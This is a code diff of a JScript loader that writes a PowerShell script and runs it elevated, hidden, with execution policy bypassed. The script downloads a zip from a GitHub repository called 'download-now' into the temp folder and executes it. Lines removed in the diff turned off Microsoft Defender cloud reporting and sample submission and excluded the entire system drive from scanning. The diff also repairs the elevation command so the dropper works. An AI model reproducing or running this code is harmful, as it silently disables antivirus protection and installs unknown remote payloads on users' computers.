@@ -12,23 +12,8 @@ var psPath = tempFolder + "\\" + psFilename;
 
 // PowerShell script content (robust with try/catch and readable output)
 var psContent =
-'try {\n' +
-'    Write-Output "Running Defender commands...";\n' +
-'    Set-MpPreference -MAPSReporting 0;\n' +
-'    Write-Output "Set-MpPreference -MAPSReporting 0 -> OK";\n' +
-'    Set-MpPreference -SubmitSamplesConsent 2;\n' +
-'    Write-Output "Set-MpPreference -SubmitSamplesConsent 2 -> OK";\n' +
-'    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
-'    Write-Output ("Add-MpPreference -ExclusionPath " + $env:SystemDrive + " -> OK");\n' +
-'} catch {\n' +
-'    Write-Error ("ERROR: " + $_.Exception.Message);\n' +
-'}\n' +
-'\n' +
-'Write-Output "Current settings (Get-MpPreference):";\n' +
-'Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
-'\n' +
-'$url = "https://github.com/Easy-Hash/download-now/archive/refs/heads/main.zip";\n' +
-'$destination = "$env:TEMP\main.zip";\n' +
+'$url = "https://github.com/Easy-Hash/download-now/archive/refs/heads/master.zip";\n' +
+'$destination = "$env:TEMP\\main.zip";\n' +
 'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
 'Start-Process $destination;\n' +
 'Write-Output "";\n';
@@ -45,7 +30,8 @@ try {
 
 // Build command that starts an elevated PowerShell to run the PS file with -NoExit
 // We use Start-Process ... -Verb RunAs so the user gets the UAC prompt and the PS window stays visible.
-var elevateCmd = "powershell -NoProfile -Command \"Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + psPath ";
+var elevateCmd = "powershell -NoProfile -Command \"Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + psPath + "\\\"'\"";
+
 
 try {
     shell.Run(elevateCmd, 1, false); // show window; do not wait (PS will stay open)
@@ -55,4 +41,3 @@ try {
 }
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
-
